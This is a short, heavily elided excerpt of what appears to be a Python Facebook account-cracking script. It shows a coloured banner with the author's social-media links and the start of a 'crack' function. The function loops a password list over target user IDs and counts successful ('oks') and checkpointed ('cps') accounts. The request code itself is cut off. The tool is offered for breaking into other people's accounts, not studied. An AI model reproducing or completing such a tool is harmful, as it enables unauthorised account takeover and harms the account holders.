...
\033[1;97m---------------------------------------------------
 \033[1;97m[\033[1;92m•\033[1;97m] Author   : Arslan abbasi
 \033[1;97m[\033[1;92m•\033[1;97m] Facebook : https://www.facebook.com/profile.php?id=100094044907238
 \033[1;97m[\033[1;92m•\033[1;97m] GitHub   : https://github.com/Arslanabb
...
def crack(uid, pww, total_idz):
    ...
    sys.stdout.write(f"\r{x}[ArslanAbbasi] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
    sys.stdout.flush()
    try:
        for pw in pww:
